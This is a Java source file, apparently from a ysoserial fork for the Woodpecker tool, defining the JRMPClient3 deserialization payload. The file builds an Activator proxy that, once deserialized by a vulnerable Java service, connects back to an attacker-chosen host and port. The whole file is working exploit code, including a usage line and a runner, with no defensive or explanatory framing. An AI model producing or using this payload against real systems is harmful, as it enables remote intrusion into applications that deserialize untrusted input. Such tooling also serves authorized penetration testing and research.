package me.gv7.woodpecker.yso.payloads;

import me.gv7.woodpecker.yso.payloads.annotation.Authors;
import me.gv7.woodpecker.yso.payloads.annotation.PayloadTest;
import me.gv7.woodpecker.yso.payloads.util.PayloadRunner;
import sun.rmi.server.UnicastRef;
import sun.rmi.transport.LiveRef;
import sun.rmi.transport.tcp.TCPEndpoint;

import java.lang.reflect.Proxy;
import java.rmi.activation.Activator;
import java.rmi.server.ObjID;
import java.rmi.server.RemoteObjectInvocationHandler;
import java.util.Random;

@SuppressWarnings ( {
    "restriction"
} )
@PayloadTest( harness="ysoserial.test.payloads.JRMPReverseConnectSMTest")
@Authors({ Authors.C0NY1 })
public class JRMPClient3 extends PayloadRunner implements ObjectPayload<Activator> {
    public JRMPClient3() {
    }

    public Activator getObject(String command) throws Exception {
        String host = null;
        int port;
        int objId;

        String[] cmds = command.split("\\:");
        if(cmds.length == 3){
            host = cmds[0];
            port = Integer.valueOf(cmds[1]);
            objId = Integer.valueOf(cmds[2]);
        }else{
            System.out.println("Usage java -jar ysoserial-for-woodpecker -g JRMPClient3 -a host:port:obj_id");
            return null;
        }

        ObjID objID = new ObjID(objId);
        TCPEndpoint tcpEndpoint = new TCPEndpoint(host, port);
        UnicastRef unicastRef = new UnicastRef(new LiveRef(objID, tcpEndpoint, false));
        RemoteObjectInvocationHandler remoteObjectInvocationHandler = new RemoteObjectInvocationHandler(unicastRef);
        Activator object = (Activator)Proxy.newProxyInstance(JRMPClient3.class.getClassLoader(), new Class[]{Activator.class}, remoteObjectInvocationHandler);
        return object;
    }

    public static void main(String[] args) throws Exception {
        Thread.currentThread().setContextClassLoader(JRMPClient3.class.getClassLoader());
        PayloadRunner.run(JRMPClient3.class, args);
    }
}
